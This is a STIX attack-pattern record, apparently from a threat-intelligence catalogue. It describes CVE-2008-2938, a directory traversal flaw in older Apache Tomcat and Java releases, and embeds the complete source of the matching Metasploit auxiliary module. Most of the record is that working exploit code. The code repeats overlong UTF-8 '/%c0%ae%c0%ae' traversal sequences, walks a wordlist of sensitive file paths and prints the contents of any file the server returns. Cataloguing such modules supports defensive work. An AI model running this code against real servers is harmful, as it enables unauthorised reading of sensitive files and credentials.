{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a45abbcd-763b-43f9-94f7-b64206cc94ea",
    "created": "2024-08-14T16:23:14.611048Z",
    "modified": "2024-08-14T16:23:14.611052Z",
    "name": "Tomcat UTF-8 Directory Traversal Vulnerability",
    "description": " This module tests whether a directory traversal vulnerability is present in versions of Apache Tomcat 4.1.0 - 4.1.37, 5.5.0 - 5.5.26 and 6.0.0 - 6.0.16 under specific and non-default installations. The connector must have allowLinking set to true and URIEncoding set to UTF-8. Furthermore, the vulnerability actually occurs within Java and not Tomcat; the server must use Java versions prior to Sun 1.4.2_19, 1.5.0_17, 6u11 - or prior IBM Java 5.0 SR9, 1.4.2 SR13, SE 6 SR4 releases. This module has only been tested against RedHat 9 running Tomcat 6.0.16 and Sun JRE 1.5.0-05. You may wish to change FILE (hosts,sensitive files), MAXDIRS and RPORT depending on your environment.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/tomcat_utf8_traversal.rb",
            "external_id": "tomcat_utf8_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-2938"
        },
        {
            "source_name": "reference",
            "url": "http://www.securityfocus.com/archive/1/499926"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanServer\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'Tomcat UTF-8 Directory Traversal Vulnerability',\n      'Description' => %q{\n        This module tests whether a directory traversal vulnerability is present\n        in versions of Apache Tomcat 4.1.0 - 4.1.37, 5.5.0 - 5.5.26 and 6.0.0\n        - 6.0.16 under specific and non-default installations. The connector must have\n        allowLinking set to true and URIEncoding set to UTF-8. Furthermore, the\n        vulnerability actually occurs within Java and not Tomcat; the server must\n        use Java versions prior to Sun 1.4.2_19, 1.5.0_17, 6u11 - or prior IBM Java\n        5.0 SR9, 1.4.2 SR13, SE 6 SR4 releases. This module has only been tested against\n        RedHat 9 running Tomcat 6.0.16 and Sun JRE 1.5.0-05. You may wish to change\n        FILE (hosts,sensitive files), MAXDIRS and RPORT depending on your environment.\n        },\n      'References' => [\n        [ 'URL', 'http://tomcat.apache.org/' ],\n        [ 'OSVDB', '47464' ],\n        [ 'CVE', '2008-2938' ],\n        [ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],\n      ],\n      'Author' => [ 'aushack', 'guerrino <ruggine> di massa' ],\n      'License' => MSF_LICENSE,\n      'DisclosureDate' => 'Jan 9 2009'\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'URI to the Tomcat instance', '/']),\n        OptPath.new('SENSITIVE_FILES', [\n          true, 'File containing senstive files, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'sensitive_files.txt')\n        ]),\n        OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7]),\n      ]\n    )\n  end\n\n  def extract_words(wordfile)\n    return [] unless wordfile && File.readable?(wordfile)\n\n    begin\n      File.readlines(wordfile, chomp: true)\n    rescue ::StandardError => e\n      elog(e)\n      []\n    end\n  end\n\n  def find_files(files)\n    traversal = '/%c0%ae%c0%ae'\n\n    1.upto(datastore['MAXDIRS']) do |level|\n      try = traversal * level\n      res = send_request_raw(\n        {\n          'method' => 'GET',\n          'uri' => normalize_uri(datastore['TARGETURI'], try, files)\n        }, 25\n      )\n      if (res && (res.code == 200))\n        print_status(\"Request ##{level} may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \\r\\n#{res.body}\")\n        @files_found << files\n        break\n      elsif (res && res.code)\n        vprint_error(\"Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}\")\n      end\n    end\n  end\n\n  def run_host(_ip)\n    @files_found = []\n\n    begin\n      print_status(\"Attempting to connect to #{rhost}:#{rport}\")\n      res = send_request_raw(\n        {\n          'method' => 'GET',\n          'uri' => normalize_uri(datastore['TARGETURI'])\n        }, 25\n      )\n\n      if res\n        extract_words(datastore['SENSITIVE_FILES']).each do |files|\n          find_files(files) unless files.empty?\n        end\n      end\n\n      if !@files_found.empty?\n        print_good('File(s) found:')\n\n        @files_found.each do |f|\n          print_good(f)\n        end\n      else\n        print_error('No File(s) found')\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ aushack",
        "guerrino <ruggine> di massa ]",
        ""
    ],
    "x_mitre_disclosure_date": "Jan 9 2009"
}